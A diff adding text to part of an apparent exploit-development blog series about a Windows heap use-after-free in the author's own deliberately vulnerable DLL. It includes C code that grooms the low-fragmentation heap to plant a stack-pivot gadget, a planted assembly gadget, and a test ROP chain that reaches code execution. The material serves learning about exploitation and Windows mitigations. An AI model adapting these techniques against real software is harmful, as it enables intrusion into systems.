@@ -121,6 +121,91 @@ If we could find a `mov rsp, rbx` gadget then we could pivot the stack to this g
 
 ## Stack Pivoting
 
-## Code Execution
+
+We an use `rp-win.exe` to look for ROP gadgets that might help us pivot the stack:
+
+<img width="866" alt="Screenshot 2025-01-24 at 08 00 48" src="https://github.com/user-attachments/assets/3b466861-a8fc-459c-90ae-025746a1d8fc" style="border: 1px solid black;" />
+
+And I find the correct gadget in `VulnDLL.dll`:
+
+<img width="897" alt="Screenshot 2025-01-24 at 08 02 35" src="https://github.com/user-attachments/assets/1c074fb5-2efd-4d6c-b437-7b14ac1de8e0" style="border: 1px solid black;" />
+
+This should come as no surpirse. I am exploring exploit development techniques, so I simply planted this rop chain in my code (in a more realistic scenario this is going to be a bit more difficult to find a ROP gadget that will achieve our objective). I added an `asm` function to the vulnerable DLL:
+
+```asm
+.CODE
+
+ROPGadgets PROC
+
+	mov rsp, rbx;
+	ret;
+
+ROPGadgets ENDP
+
+END
+```
+
+Now we have a ROP gadget to pivot the stack we can change our exploit code to brute force the freed LFH chunk with our stack pivot gadget:
+
+```c
+// attempt to reallocate to the freed memory
+LPVOID alloc = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xb0);
+if (alloc != NULL)
+{
+    memset(alloc, 0x41, 0xb0);
+    *(LONGLONG*)alloc = (LONGLONG)(dllBase + 0x1290);                           // mov rsp, rbx ; ret ;
+}                                                                               // rbx points to our general buffer (rop chain)
+
+// brute force the LFH
+for (size_t c = 0; c < 0x100; c++)
+{
+    Allocate(alloc, 0xb0);
+}
+```
+
+Testing this in `WinDbg` by adding a breakpoint on `VulnDll + 0x1290` we can test our theory out:
+
+<img width="944" alt="Screenshot 2025-01-24 at 08 10 42" src="https://github.com/user-attachments/assets/33da2c65-c882-476f-8e74-ff107c4ee367" style="border: 1px solid black;" />
+
+When we run the application we hit our breakpoint. We can step through `mov rsp, rbx` and then `ret` and we get an `Access Violation`; this is good! If we look at where `rsp` now points, it points to the general buffer. This means we have pivoted our stack to an area of memory that we control. We can write a test ROP chain to this memory next.
+
+## Test ROP Chain
+
+In the final part of this blog I will write to the general buffer with a test ROP chain; basically some ROP NOPs and an `int3` instruction. Just to prove that it works as intended.:
+
+```c
+// allocate to the general buffer
+LPVOID globalAlloc = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);
+if (globalAlloc != NULL)
+{
+    memset(globalAlloc, 0x42, 0x1000);
+
+    // build rop chain in the general buffer
+    DWORD index = 0;
+    PDWORD64 rop = (PDWORD64)(globalAlloc);
+
+    rop[index] = dllBase + 0x1007; index += 1;                                  // ret ; (rop nop)
+    rop[index] = dllBase + 0x1007; index += 1;                                  // ret ; (rop nop)
+    rop[index] = dllBase + 0x1007; index += 1;                                  // ret ; (rop nop)
+    rop[index] = dllBase + 0x1007; index += 1;                                  // ret ; (rop nop)
+    rop[index] = ntdllBase + 0xa3060; index += 1;                               // int3 ; ret ; (debug)
+
+    GlobalAllocate(globalAlloc, 0x1000);
+}
+```
+
+Instead of allocating and writing `0x1000` `B` characters I have allocated and written a very small ROP chain to test that everything works as intended. Let's test this!
+
+<img width="954" alt="Screenshot 2025-01-24 at 08 20 10" src="https://github.com/user-attachments/assets/93d02e13-424e-4166-98f1-1bfa211dd845" style="border: 1px solid black;" />
+
+Everything looks to be working as intended. We break on the brute forced stack pivot, we step through the pivot and note that the stack is now located at our allocated general buffer, when we continue execution we hit the `int3` ROP gadget. We now have code execution!
+
+Hopefully this helps illustrate what has happened so far:
+
+<img width="1061" alt="Screenshot 2025-01-24 at 08 35 17" src="https://github.com/user-attachments/assets/5c6b5e40-09dc-4d4c-a59e-a739eeca32df" style="border: 1px solid black;" />
+
+## What Next?
+
+In the next part things will start to get interesting. If all goes to plan, I will write about how I will execute shellcode in the general buffer, repair the registers and the stack (so the app doesn't crash), and start switching on mitigations! This is the main reason I am writing all of this. It is good to solidify my understanding of the exploitation techniques so far, but I need to understand the mitigations in Windows and how I might be able to work around them.
 
 [Home](https://plackyhacker.github.io) : [Part 1](https://plackyhacker.github.io/binary/all-the-leaks) : Part 2
